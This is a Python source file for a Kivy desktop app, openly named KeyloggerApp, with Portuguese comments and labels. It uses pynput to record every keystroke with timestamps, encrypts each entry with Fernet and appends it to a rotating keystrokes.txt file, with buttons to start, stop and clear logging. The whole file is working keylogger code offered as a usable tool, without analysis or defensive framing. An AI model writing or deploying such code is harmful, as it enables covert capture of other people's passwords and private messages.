import os
import datetime
from cryptography.fernet import Fernet
from pynput import keyboard
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.widget import Widget
from kivy.core.window import Window
from kivy.graphics import Color, Rectangle
from threading import Thread

# Gere e salve a chave de criptografia em um local seguro
key = Fernet.generate_key()
cipher_suite = Fernet(key)

log_file = "keystrokes.txt"
max_size = 10 * 1024 * 1024  # 10 MB

def rotate_log_file():
    if os.path.getsize(log_file) > max_size:
        base, ext = os.path.splitext(log_file)
        for i in range(1, 100):
            new_file = f"{base}_{i}{ext}"
            if not os.path.exists(new_file):
                os.rename(log_file, new_file)
                break

def encrypt_data(data):
    return cipher_suite.encrypt(data.encode()).decode()

def on_press(key):
    try:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        data = f"{timestamp} - {key.char}\n"
    except AttributeError:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        data = f"{timestamp} - [{key}]\n"
    
    encrypted_data = encrypt_data(data)
    
    with open(log_file, "a") as f:
        f.write(encrypted_data)
    
    rotate_log_file()

class KeyloggerApp(App):
    def build(self):
        self.is_logging = False
        
        # Define a cor de fundo da janela
        Window.clearcolor = (0.2, 0.2, 0.2, 1)  # Cor cinza escuro
        
        # Main layout
        layout = BoxLayout(orientation='vertical', padding=20, spacing=20)
        
        # Status label
        self.status_label = Label(
            text="Logger Inativo",
            size_hint=(1, 0.3),
            font_size='20sp',
            bold=True,
            color=(1, 1, 1, 1)  # Cor branca
        )
        layout.add_widget(self.status_label)
        
        # Start/Stop button
        self.start_stop_btn = Button(
            text="Iniciar Logger",
            size_hint=(1, 0.3),
            font_size='18sp',
            background_color=(0.3, 0.6, 0.3, 1),  # Verde
            background_normal=''  # Remove o padrão do botão
        )
        self.start_stop_btn.bind(on_press=self.toggle_logger)
        layout.add_widget(self.start_stop_btn)
        
        # Clear logs button
        clear_btn = Button(
            text="Limpar Logs",
            size_hint=(1, 0.3),
            font_size='18sp',
            background_color=(0.6, 0.3, 0.3, 1),  # Vermelho
            background_normal=''  # Remove o padrão do botão
        )
        clear_btn.bind(on_press=self.clear_logs)
        layout.add_widget(clear_btn)
        
        return layout

    def toggle_logger(self, instance):
        if not self.is_logging:
            # Start the keylogger
            self.is_logging = True
            self.status_label.text = "Logger Ativo"
            self.status_label.color = (0.0, 1.0, 0.0, 1)  # Verde para indicar atividade
            self.start_stop_btn.text = "Parar Logger"
            self.start_stop_btn.background_color = (0.7, 0.2, 0.2, 1)  # Vermelho
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener_thread = Thread(target=self.listener.start)
            self.listener_thread.start()
        else:
            # Stop the keylogger
            self.is_logging = False
            self.status_label.text = "Logger Inativo"
            self.status_label.color = (1, 1, 1, 1)  # Branco para indicar inatividade
            self.start_stop_btn.text = "Iniciar Logger"
            self.start_stop_btn.background_color = (0.3, 0.6, 0.3, 1)  # Verde
            if self.listener is not None:
                self.listener.stop()
    
    def clear_logs(self, instance):
        with open(log_file, 'w') as f:
            f.write('')  # Clear the log file
        self.status_label.text = "Logs limpos"
        self.status_label.color = (1, 1, 0, 1)  # Amarelo para indicar ação

if __name__ == '__main__':
    KeyloggerApp().run()
